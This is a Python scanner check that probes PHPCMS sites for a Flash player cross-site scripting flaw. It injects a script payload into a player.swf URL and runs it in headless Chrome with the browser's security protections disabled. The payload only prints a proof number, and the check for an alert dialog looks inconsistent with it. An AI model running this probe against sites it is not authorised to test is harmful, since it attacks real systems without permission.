def _verify(url, cookies, uagent, vulns, proxy):
    pocdict = {
        "vulnname":"phpcms_player_flashxss",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        "response":"",
        "exception":"",
    }
    headers = {
        "User-Agent" : uagent,
    }
    payload = "statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf&stream=\%22))}catch(e){document.write(12345*54321)}//"
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.support import expected_conditions as EC
        prefs = {
            "profile.default_content_setting_values.plugins": 1,
            "profile.content_settings.plugin_whitelist.adobe-flash-player": 1,
            "profile.content_settings.exceptions.plugins.*,*.per_resource.adobe-flash-player": 1,
            "PluginsAllowedForUrls": "https://url.com"
        }
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-xss-auditor')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-web-security')
        chrome_options.add_argument('--allow-running-insecure-content')
        chrome_options.add_experimental_option('prefs', prefs)
        browser = webdriver.Chrome(options=chrome_options)
        browser.set_page_load_timeout(15)
        browser.set_script_timeout(15)
        vurl = urllib.parse.urljoin(url, payload)
        browser.get(vurl)
        print(browser.page_source)
        if r'670592745' in EC.alert_is_present()(browser).text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['proof'] = '670592745 found'
            pocdict['response'] = str(EC.alert_is_present()(browser).text)
        browser.quit()

    except Exception as e:
        pocdict['exception'] = str(e)
    vulns.append(pocdict)
_verify(self.url, self.cookies, findProxy().randomUA(), self.vulns, self.proxynode)